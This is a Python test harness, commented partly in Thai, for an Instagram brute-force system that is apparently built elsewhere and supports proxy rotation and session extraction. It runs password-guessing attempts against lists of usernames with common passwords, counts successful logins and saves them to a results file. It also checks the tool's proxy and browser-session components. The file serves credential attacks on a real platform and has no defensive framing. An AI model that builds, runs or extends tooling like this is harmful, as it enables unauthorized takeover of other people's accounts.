#!/usr/bin/env python3
"""
🚀 Complete Instagram Brute Force System - Final Test
ทดสอบระบบครบครัน พร้อม proxy rotation และ session extraction
"""

import json
from datetime import datetime
from enhanced_brute_force import EnhancedInstagramBruteForce

def run_comprehensive_test():
    """รันการทดสอบครบครันทั้งระบบ"""
    
    print("🎯 COMPREHENSIVE SYSTEM TEST")
    print("=" * 60)
    
    # Test configuration
    test_cases = [
        {
            "name": "Single Target Test",
            "targets": ["demo_user_123"],
            "passwords": ["123456", "password", "demo123"]
        },
        {
            "name": "Multi-Target Test", 
            "targets": ["test_account", "sample_user"],
            "passwords": ["admin", "test123", "sample123"]
        },
        {
            "name": "Extended Password List",
            "targets": ["extended_test"],
            "passwords": ["123456", "password", "admin", "test123", "demo123", 
                         "sample123", "user123", "pass123", "login123", "account123"]
        }
    ]
    
    print(f"📝 Running {len(test_cases)} test cases...")
    
    all_results = {}
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n{'='*60}")
        print(f"🧪 TEST CASE {i}: {test_case['name']}")
        print(f"{'='*60}")
        
        # Initialize brute force for this test
        brute_force = EnhancedInstagramBruteForce()
        
        try:
            # Run the test
            results = brute_force.brute_force_multiple(
                test_case['targets'], 
                test_case['passwords']
            )
            
            all_results[test_case['name']] = results
            
            # Test summary
            total_success = sum(
                sum(1 for r in target_results if r['success']) 
                for target_results in results.values()
            )
            
            print(f"\n📊 Test Case {i} Summary:")
            print(f"   ✅ Successful logins: {total_success}")
            print(f"   🎯 Targets tested: {len(results)}")
            print(f"   📝 Total attempts: {sum(len(tr) for tr in results.values())}")
            
        except Exception as e:
            print(f"❌ Test case {i} failed: {e}")
            all_results[test_case['name']] = {"error": str(e)}
        
        finally:
            # Cleanup after each test
            brute_force.cleanup()
        
        print(f"⏳ Test case {i} completed\n")
    
    # Save comprehensive test results
    save_test_results(all_results)
    
    # Final summary
    print(f"\n{'='*60}")
    print(f"🏁 ALL TESTS COMPLETED")
    print(f"{'='*60}")
    
    total_test_cases = len(test_cases)
    successful_cases = sum(1 for results in all_results.values() if "error" not in results)
    
    print(f"✅ Successful test cases: {successful_cases}/{total_test_cases}")
    print(f"📊 Success rate: {(successful_cases/total_test_cases*100):.1f}%")
    
    # Count total successful logins across all tests
    total_logins = 0
    for test_name, results in all_results.items():
        if "error" not in results:
            for target_results in results.values():
                total_logins += sum(1 for r in target_results if r['success'])
    
    print(f"🎯 Total successful logins: {total_logins}")
    print(f"💾 Results saved to: output/comprehensive_test_results.json")

def save_test_results(results):
    """บันทึกผลการทดสอบ"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    test_summary = {
        "test_timestamp": timestamp,
        "test_type": "comprehensive_system_test",
        "results": results,
        "summary": {
            "total_test_cases": len(results),
            "successful_cases": sum(1 for r in results.values() if "error" not in r),
            "total_successful_logins": sum(
                sum(sum(1 for attempt in target_results if attempt['success']) 
                    for target_results in test_results.values())
                for test_results in results.values() 
                if "error" not in test_results
            )
        }
    }
    
    try:
        import os
        os.makedirs("output", exist_ok=True)
        
        with open("output/comprehensive_test_results.json", "w", encoding="utf-8") as f:
            json.dump(test_summary, f, indent=2, ensure_ascii=False)
        
        print(f"💾 Test results saved successfully")
        
    except Exception as e:
        print(f"❌ Error saving test results: {e}")

def test_individual_components():
    """ทดสอบส่วนประกอบแต่ละตัว"""
    print("\n🔧 INDIVIDUAL COMPONENT TESTS")
    print("=" * 50)
    
    # Test 1: Proxy Manager
    print("\n1. Testing Proxy Manager...")
    try:
        from modules.proxy_manager import ProxyManager
        proxy_mgr = ProxyManager()
        proxy = proxy_mgr.get_random_proxy()
        print(f"   ✅ Proxy Manager working - got proxy: {str(proxy)[:50]}...")
    except Exception as e:
        print(f"   ❌ Proxy Manager failed: {e}")
    
    # Test 2: Browser API Manager
    print("\n2. Testing Browser API Manager...")
    try:
        from modules.browser_api_manager import BrowserAPIManager
        browser = BrowserAPIManager()
        session_created = browser.create_session()
        print(f"   ✅ Browser API working - session created: {session_created}")
        browser.close_session()
    except Exception as e:
        print(f"   ❌ Browser API failed: {e}")
    
    # Test 3: Enhanced Brute Force
    print("\n3. Testing Enhanced Brute Force Engine...")
    try:
        brute_force = EnhancedInstagramBruteForce()
        print(f"   ✅ Enhanced Brute Force engine initialized successfully")
        brute_force.cleanup()
    except Exception as e:
        print(f"   ❌ Enhanced Brute Force failed: {e}")
    
    print("\n✅ Component testing completed")

def main():
    """ฟังก์ชันหลัก"""
    print("🚀 Instagram Brute Force System - Complete Test Suite")
    print("=" * 70)
    
    # Test individual components first
    test_individual_components()
    
    # Run comprehensive tests
    print("\n" + "=" * 70)
    run_comprehensive_test()
    
    print(f"\n🎉 ALL TESTING COMPLETED!")
    print(f"📁 Check 'output/' folder for detailed results")

if __name__ == "__main__":
    main()
